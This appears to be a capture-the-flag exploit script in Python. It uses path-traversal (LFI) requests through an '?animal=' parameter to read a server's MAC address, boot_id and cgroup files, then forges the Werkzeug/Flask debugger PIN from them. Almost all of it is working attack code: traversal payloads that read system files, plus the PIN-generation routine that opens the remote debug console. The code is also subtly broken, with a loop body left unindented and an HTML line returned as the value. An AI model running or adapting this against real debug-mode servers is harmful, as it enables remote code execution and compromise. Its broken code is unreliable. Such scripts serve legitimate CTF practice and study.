import hashlib
from itertools import chain
import requests


probably_public_bits = [
    'loremipsum',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.6/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
]

#LFI through ?animal= query. Give this function url with LFI and it will print the correct value.
def getVal(url):
    r = requests.get(url)
    for line in r.text.splitlines():
    if line.startswith("<blockquote>"):
        return(line)


private_bits = [
    getVal("http://chal.b01lers.com:5000/?animal=%2F..%2F..%2Fsys/class/net/eth0/address"),
    getVal("http://chal.b01lers.com:5000/?animal=%2F..%2F..%2Fproc/sys/kernel/random/boot_id")+getVal("http://chal.b01lers.com:5000/?animal=%2F..%2F..%2Fproc/self/cgroup")
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')


num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)